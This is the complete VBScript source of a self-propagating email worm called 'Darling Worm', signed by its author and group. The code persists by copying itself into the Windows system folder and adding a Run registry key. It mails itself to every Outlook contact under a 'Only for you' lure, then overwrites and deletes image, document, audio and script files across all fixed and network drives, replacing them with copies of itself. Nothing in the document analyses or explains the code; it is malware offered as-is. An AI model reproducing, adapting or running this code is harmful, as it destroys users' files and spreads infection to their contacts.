rem Darling Worm - VBS 
rem By:Dr.Dark Mail: drdark@kki.net.pl Group: SiliciumRevolte

On Error Resume Next

Dim FileSystemObject,DirSystem,vbscopy,Mail,File,Register,RegLists,FileLocation,MakeFile,Lists,Address,CountOur,Enter,ListAddress,RegAddress

Set FileSystemObject=CreateObject("Scripting.FileSystemObject")
Set DirSystem=FileSystemObject.GetSpecialFolder(1)
vbscopy=File.ReadAll
Set OutLook=WScript.CreateObject("Outlook.Application")
Set mapi=OutLook.GetNameSpace("MAPI")
Set Mail=OutLook.CreateItem(0)
Set File=FileSystemObject.OpenTextFile(WScript.ScriptFullname,1) 
Set Register=CreateObject("WScript.Shell")
RegLists=Register.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&Address)
Set MakeFile=FileSystemObject.GetFile(WScript.ScriptFullName)
Set Address=mapi.AddressLists(Lists)

CountOur=1
ListAddress=Address.AddressEntries(Count)
RegAddress=""
RegAddress=Register.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&ListAddress)

MakeFile.Copy(dirsystem&"\User32.dll.vbs")
FileLocation=dirsystem&"\User32.dll.vbs"
Register.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\User32", FileLocation

For Lists=1 to mapi.AddressLists.Count
If (RegLists="") then
RegLists=1

End If

If (int(Address.AddressEntries.Count)>int(RegLists)) then
For Enter=1 to Address.AddressEntries.Count
ListAddress=Address.AddressEntries(Count)
RegAddress=""
RegAddress=Register.RegRead("HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WAB\"&ListAddress)
If (RegAddress="") then

Set Mail=OutLook.CreateItem(0)
Mail.Recipients.Add(ListAddress)
Mail.Subject="Only for you"
Mail.Body=vbcrlf & "I found for you very important document dont show anyone" & vbcrlf & "Darling"
Mail.Attachments.Add(dirsystem&"\User32.dll.vbs")
Mail.Send
Register.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"& ListAddress,1,"REG_DWORD"
End If
Next

Count=Count+1

Register.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" &Address,Address.AddressEntries.Count
Else
Register.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" &Address,Address.AddressEntries.Count
End If
Next
Set OutLook=Nothing
Set mapi=Nothing

Listadriv()

sub Listadriv
On Error Resume Next
Dim d,dc,s
Set dc = FileSystemObject.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
Listadriv = s
end sub

sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,s,bname

vbscopy=File.ReadAll
set f = FileSystemObject.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=FileSystemObject.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=FileSystemObject.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif (ext="jpg") or (ext="jpeg") or (ext="gif") or (ext="doc") or (ext="mpg") or (ext="mp3") then  
set ap=FileSystemObject.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=FileSystemObject.GetBaseName(f1.path)
set cop=FileSystemObject.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
FileSystemObject.DeleteFile(f1.path)
set cop=FileSystemObject.GetFile(f1.path)
cop.copy(f1.path&".vbs")
FileSystemObject.DeleteFile(f1.path)
set att=FileSystemObject.GetFile(f1.path)
att.attributes=att.attributes+2
end if
next  
end sub

sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f = FileSystemObject.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub